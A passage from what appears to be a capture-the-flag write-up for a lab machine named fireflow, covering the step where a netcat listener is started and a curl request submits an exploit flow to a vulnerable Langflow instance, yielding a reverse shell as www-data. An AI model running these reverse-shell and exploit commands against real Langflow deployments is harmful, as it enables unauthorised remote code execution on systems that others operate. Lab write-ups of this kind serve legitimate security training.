10. Catching the Reverse Shell

Start a listener on the attacking machine:

nc -lvnp 4443

Then submit the malicious flow:

curl -sk -X POST 'https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow' \
    -H 'Content-Type: application/json' \
    -b 'client_id=attacker' \
    -d @exploit.json

The vulnerable Langflow instance executes the embedded Python code and connects back to the listener.

We now have a shell as:

www-data

Example:

www-data@fireflow:/var/lib/langflow$ whoami
www-data

